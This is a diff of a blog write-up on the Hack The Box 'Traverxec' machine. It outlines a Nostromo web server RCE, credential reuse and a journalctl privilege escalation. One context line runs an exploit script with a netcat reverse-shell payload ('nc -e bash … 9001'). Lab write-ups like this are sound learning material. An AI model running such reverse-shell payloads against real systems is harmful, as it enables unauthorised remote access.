@@ -6,11 +6,11 @@ header:
   image: /images/traverxec/traverxec_bio.png
   teaser: /images/traverxec/traverxec_bio.png
 share_image: /images/traverxec/traverxec_bio.png
-published: true
 author_profile: true
 tags:
   - Writeup
   - kali
+  - hack the box
 
 sidebar:
   - title: "Traverxec"
@@ -26,6 +26,8 @@ sidebar:
 
 Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!
 
+---
+
 # Enumeration
 
 ```bash
@@ -37,6 +39,8 @@ nmap -p$ports -sC -sV 10.10.10.165
 ![Initial NMAP](/images/traverxec/nmap.png)
 
 Once the scan completes, it reveals ports 22 and 80 are open. NMAP also reports that the `http-server-header` is `nostromo 1.9.6`, which indicates the box is running the `Nostromo` HTTP server.
+
+---
 
 # Nostromo
 
@@ -80,6 +84,8 @@ python 47837.py "nc -e bash 10.10.10.165 9001"
 ```
 
 And........ We get a shell
+
+---
 
 
 # Metasploit
